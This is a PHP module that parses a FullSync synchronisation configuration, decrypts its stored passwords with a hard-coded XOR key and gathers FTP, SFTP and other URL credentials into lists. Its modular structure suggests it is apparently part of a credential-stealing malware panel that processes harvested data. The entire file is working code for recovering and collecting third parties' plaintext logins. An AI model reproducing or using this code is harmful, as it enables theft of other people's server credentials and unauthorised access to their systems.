<?php

class Module_fullsync extends Module_
{
    protected function decrypt__($Source)
    {
        $m_key = "FULLSYNC1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZ";

        $pos = (strlen($Source) / 3) % strlen($m_key);

        $ret = '';
        for ($i = 0; $i < strlen($Source) / 3; $i++)
        {
            $number = 0;
            $digit = $Source {$i * 3};
            if (($digit < '0') || ($digit > '9'))
                return "";

            $number += ($digit - '0') * 100;
            $digit = $Source {$i * 3 + 1};
            if (($digit < '0') || ($digit > '9'))
                return "";

            $number += ($digit - '0') * 10;
            $digit = $Source {$i * 3 + 2};

            if (($digit < '0') || ($digit > '9'))
                return "";

            $number += $digit - '0';
            $x = ($i + $pos) % strlen($m_key);
            $ret .= chr($number ^ ord($m_key {$x}));
        }
        return $ret;
    }

    protected function ProcessItem($Data)
    {
        if(isset($Data["password"]))
        {
            $Url  = Assign_($Data["uri"]);
            $Pass = $this->decrypt__(trim($Data["password"]));
            $User = Assign_($Data["username"]);

            $Parts = parse_url($Url);
            $Port = '';
            if(isset($Parts['port']))
                $Port = Assign_($Parts['port']);

            if($Parts['scheme'] == 'sftp' || $Parts['scheme'] == 'ftp')
            {
                $this->add_ftp($this->append_port($this->ftp_force_ssh($Parts['host'], $Parts['scheme'] == 'sftp') , $Port), $User, $Pass);
            }

            else
            {
                if($Parts['scheme'] != 'file')
                {
                    if(isset($Parts['port']))
                        $Port = ':'.$Parts['port'];

                    $this->insert_other($Parts['scheme'].'://'.$User.':'.$Pass.'@'.$Parts['host'].$Port);
                }

            }

        }

    }

    function ProcessFullSync($Data)
    {
        $XML_ = simplexml_load_string($Data);
        if(!$XML_)
            return FALSE;

        foreach($XML_ as $Elements => $Element)
        {
            $this->ProcessItem($Element->Source);
            $this->ProcessItem($Element->Destination);
        }
        $XML_ = NULL;
    }

    public function process_module($Data, $Version)
    {
        switch ($Version)
        {
        case 0:
            $this->ProcessFullSync($Data);
            break;
        default:
            return FALSE;
        }

        return TRUE;
    }
}
